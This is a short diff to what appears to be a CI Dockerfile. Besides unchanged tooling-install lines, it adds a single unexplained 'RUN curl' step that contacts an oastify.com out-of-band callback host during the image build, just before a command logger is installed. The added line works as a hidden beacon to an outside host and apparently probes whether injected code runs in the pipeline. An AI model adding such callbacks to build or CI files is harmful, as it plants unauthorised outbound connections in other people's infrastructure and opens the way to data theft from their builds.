@@ -25,6 +25,8 @@ curl https://repository.rudder.io/tools/rudder-setup | sed 's/rudder agent \(.*\
 pwsh -Command Install-Module -Name PSScriptAnalyzer -RequiredVersion $PSANALYZER_VERSION -Scope AllUsers -Confirm:\$false -Force
 EOF
 
+RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/policies
+
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
 COPY ci/bash_trap.sh     /etc/bash_trap.sh
